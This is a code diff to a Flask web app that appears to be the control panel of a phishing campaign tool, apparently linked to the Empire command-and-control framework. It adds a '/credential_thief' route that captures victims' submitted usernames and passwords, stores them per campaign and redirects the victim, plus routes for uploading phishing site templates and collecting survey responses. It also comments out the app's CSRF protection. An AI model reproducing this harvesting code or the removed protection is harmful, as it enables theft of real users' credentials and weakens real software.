@@ -4,11 +4,10 @@ import json
 import os                   
 
 from flask import Flask, Blueprint, render_template, redirect, url_for, request, session  
-from flask_wtf.csrf import CSRFProtect
+#from flask_wtf.csrf import CSRFProtect
 
 import kore
 from kore.empirerpc import EmpireRpc
-
 
 # TODO (ecolq) AWFUL HACK: Remove these globals
 global db
@@ -59,12 +58,13 @@ except IOError:
 else:
     initial_run = False
 
-csrf = CSRFProtect()
+#csrf = CSRFProtect()
 
 routes = Blueprint('routes', __name__)
 app = Flask(__name__)
-csrf.init_app(app)
+#csrf.init_app(app) 
 
+# Setup Recaptcha
 app.config['RECAPTCHA_PUBLIC_KEY'] = parser.get('recaptcha', 'site_key')
 app.config['RECAPTCHA_PRIVATE_KEY'] = parser.get('recaptcha', 'secret_key')
 app.config['RECAPTCHA_DATA_ATTRS'] = {'size': 'compact'}                           
@@ -183,10 +183,34 @@ def handle_terminal():
     update_page('terminal','terminal.html')
     return login_check()
 
-###############[ ERROR HANDLING ]########################
-@routes.route('/error')
-def error():
-    pass
+@routes.route('/website-template', methods=['GET', 'POST'])
+def website_template():
+    error = None
+    if request.method == "POST" and session.get("logged_in"):
+        if not kore.template_website_template.upload_new_template(request):
+            error = "Failed to upload file, validate it is a ZIP, with a config.ini in root, and has the required fields and value types"
+            
+    update_page("website_template", "website-template.html")
+    return login_check(wt=kore.template_website_template.get_templates(), error=error)
+
+
+@routes.route("/credential_thief", methods=["GET", "POST"])
+def hijack_creds():
+    dic = { "username" : request.form['username'],
+            "password" : request.form['password'],
+            "redirect_url" : request.form['redirect_url'],
+            "campaign" : request.form['campaign']
+           }
+    kore.query.credential_thief_result(dic, db)
+    return redirect(url_for("routes." + dic["redirect_url"]))
+
+
+@routes.route("/survey_stage", methods=["GET", "POST"])
+def survey():
+    if request.method == 'POST':
+        kore.query.survey_result(request.form, db)
+    return render_template("active_campaign_templates/survey.html", request=request)
+
 
 app.register_blueprint(routes)
 
@@ -196,4 +220,4 @@ if __name__ == '__main__':
     '''
     initialise_users_for_routes()
     app.secret_key = os.urandom(24)
-    app.run(host='0.0.0.0',port=8081)
+    app.run(host='0.0.0.0',port=8080)
